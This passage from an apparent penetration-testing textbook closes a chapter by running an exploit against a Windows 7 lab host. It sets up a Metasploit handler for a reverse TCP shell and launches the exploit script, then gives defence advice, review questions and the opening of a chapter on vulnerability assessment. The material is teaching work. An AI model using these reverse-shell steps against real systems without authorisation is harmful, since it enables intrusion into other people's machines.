    Finally, we can comment on the section that creates a text file because we really
    do not need it anymore. The final code should look like as shown in *[Figure 5.32](#c05.xhtml#fig5_32)*:


    ![](images/Figure-5.32.jpg)


    **Figure 5.32:** Final exploit file after modifying the code


    Now, all we have left to do now is run the exploit.


    ## Run the finished exploit


    To complete the exploit, we need something to catch the shell once the payload
    executes. We can use the multipurpose handler in Metasploit for this. In a new
    terminal, use the following commands:


    ```

    msfconsole

    use exploit/multi/handler

    ```


    You should see the `exploit(multi/handler)` prompt. We just need to set the payload
    to match whatever we specified when we created the shellcode earlier, which in
    this case, is a reverse TCP shell.


    ```

    set payload windows/shell/reverse_tcp

    ```


    Next, set the appropriate listening host:


    ```

    set lhost 192.168.1.128

    ```


    And the listening port:


    ```

    set lport 9001

    ```


    And we can start the handler:


    ```

    Run

    ```


    The output of the commands we entered previously can be seen in *[Figure 5.33](#c05.xhtml#fig5_33):*


    ![](images/Figure-5.33.jpg)


    **Figure 5.33:** msfconsole commands


    It will listen for any incoming connections, and if everything goes smoothly,
    we will get a Meterpreter session once our exploit completes.


    Finally, we should have everything in place and ready to go. We can launch the
    exploit just like we did earlier in our test run from within the exploit directory,
    as shown in *[Figure 5.34](#c05.xhtml#fig5_34):*


    ```

    python exploit.py 192.168.1.129

    ```


    ![](images/Figure-5.34.jpg)


    **Figure 5.34:** Run exploit


    This time we should see different results. Ignore the errors, and if it does not
    work the first time, just try again. Once the exploit successfully completes,
    we should see a session open back on our listener, as shown in *[Figure 5.35](#c05.xhtml#fig5_35):*


    ![](images/Figure-5.35.jpg)


    **Figure 5.35:** msfconsole output


    We can verify we have compromised the target with the `whoami` command, as shown
    in *[Figure 5.36](#c05.xhtml#fig5_36):*


    ![](images/Figure-5.36.jpg)


    **Figure 5.36:** whoami command output


    Congratulations! Over a wireless network, we were able to detect and exploit a
    susceptible host.


    # Preventing against threats


    We must always be aware of how to defend ourselves against these threats and attacks.
    After that, we will go over how to defend ourselves against these attacks.


    # Prevention identification of hosts


    Small and large enterprises should have a hardware firewall, such as the WatchGuard
    XTM, Cisco ASA, or Next Generation Firewalls such as FortiGate, Palo Alto, and
    Checkpoint, with custom rules to block services and ports that are not in use
    to protect themselves from threats and dangers. To prevent unwanted access, services
    that are not in use should be disabled on the server or network device. Intrusion
    detection systems with SMS or e-mail alerting capabilities. Protocols should be
    logged, and alerts should be flagged by the firewall.


    How would you know if your organization has been hacked if the firewall or IDS
    is not being monitored? It is critical to monitor your network daily if you want
    to keep ahead of threats and problems. VLANs can be used to separate your networks.
    To keep the network safe from network viruses and compromise, each server, workstation,
    VoIP, and wireless device should have its own VLAN.


    # Preventing others from determining your network size


    Any sensitive information, including network diagrams, passwords, logs, workstation
    and server information, and configuration settings, should always be encrypted
    when evaluating network size. Small and large enterprises can use a hardware firewall
    such WatchGuard XTM or Cisco ASA to regulate traffic by blocking ICMP and only
    permitting traffic from trusted sources.


    # Protection of vulnerable hosts


    Install the latest security updates offered by your vendors to safeguard your
    computers and network devices from exploitation. When new operating systems and
    software updates become available, install them. If you run into problems while
    upgrading, contact your program vendor. Use the most secure Wi-Fi encryption,
    WPA2 or WPA3, which uses the AES encryption technique and a long password. On
    all your workstations and servers, run a real-time antivirus scanner with the
    most recent virus definitions. Staff members should receive security awareness
    training.


    # Conclusion


    Wow! In this chapter, we accomplished three demonstrations! This chapter was a
    lot of fun and was also quite interesting. Let us look back at what you have learned
    so far.


    We addressed why it is critical to determine the number of live hosts while executing
    a network penetration test in this chapter. After that, we used Kali Linux to
    detect hosts on the network. Then, as a penetration tester, we demonstrated how
    to determine network size and why it is vital to know. We wrapped off the chapter
    by demonstrating how to use the Nessus vulnerability scanner to find vulnerabilities
    in Windows 7, as well as a list of possible mitigations.


    We will go over how to organize a vulnerability assessment, configure the Nessus
    vulnerability scanner, run the scanner, and patch vulnerabilities in the following
    chapter. Let us now get started on the upcoming chapter!


    # Questions


    1.  Mention the most famous network mapping tools.


    2.  How do we determine the network size?


    3.  How do we detect vulnerable hosts in your network in detail?


    4.  What are the prevention methods to defend ourselves against attacks?


    # CHAPTER 6


    # Wireless Vulnerability Assessment


    # Introduction


    We spoke about how to get on the network and find out who is on it in the previous
    chapter. In this chapter, we will look at vulnerability assessments, which raises
    the question: what exactly is a vulnerability assessment?


    A vulnerability assessment, also known as vulnerability analysis, is the process
    through which a security professional uncovers, identifies, and categorizes potential
    security vulnerabilities (holes) in a computer system, network, or other electronic
    infrastructure. Vulnerability assessments can also be used to evaluate threats
    and propose an appropriate countermeasure. When conducting vulnerability assessments,
    most security experts follow a step-by-step procedure. The following is a typical
    vulnerability assessment:


    *   Identifying and categorizing computer systems and networks

    *   Creating a list of the most critical services

    *   Identifying each service’s possible security threats

    *   Developing a defense strategy to counter potential threats

    *   Finding measures to minimize or reduce risk in the event of an attack


    If a person or organization discovers a vulnerability, they are liable for it
    and must notify the vendor. A zero-day vulnerability is one that is discovered
    as a high-level threat without the vendor being notified. When a vulnerability
    is not addressed or patched by the developer, a zero-day attack will be prevalent.
    This is well-known when a vendor’s device or software is no longer supported.


    If the threat is modest, the vendor will most likely wait until the next update
    to release a patch. It all relies on the nature of the threat and what it is capable
    of. A vulnerability that allows remote executables or, worse, root or administrator
    rights without authorization should be patched as soon as possible; however, this
    is not always the case. It is contingent on how the vendor handles such a circumstance.
    It is possible that the organization will not be able to afford it.

